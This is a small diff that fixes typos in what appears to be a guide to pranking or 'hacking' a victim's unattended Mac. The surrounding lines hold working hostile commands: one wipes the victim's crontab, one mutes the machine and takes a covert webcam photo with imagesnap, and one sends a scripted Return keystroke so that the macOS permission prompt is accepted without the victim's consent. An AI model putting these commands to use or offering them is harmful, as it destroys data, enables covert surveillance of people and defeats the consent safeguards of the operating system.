@@ -77,7 +77,7 @@ echo "" | crontab - && crontab -r
 ```shell
 # One privilege of hacking Mac is we have access to applescript.
 osascript -e 'set volume 7'
-pen https://www.youtube.com/watch?v=dQw4w9WgXcQ
+open https://www.youtube.com/watch?v=dQw4w9WgXcQ
 ```
 
 * Accessing sudo privilege
@@ -97,7 +97,7 @@ brew install imagesnap
 osascript -e 'set volume 0'  # mute
 imagesnap ~/a.png
 osascript -e 'tell application "System Events" to delay 1' && / 
-osascript -e 'tell application "System Events" to keystroke return'  # Mac will ask for permission, make the victim hit enter!
+osascript -e 'tell application "System Events" to keystroke return'  # Mac will ask for permission, make the victim hits enter!
 ```
 
 ## Author and Contributors
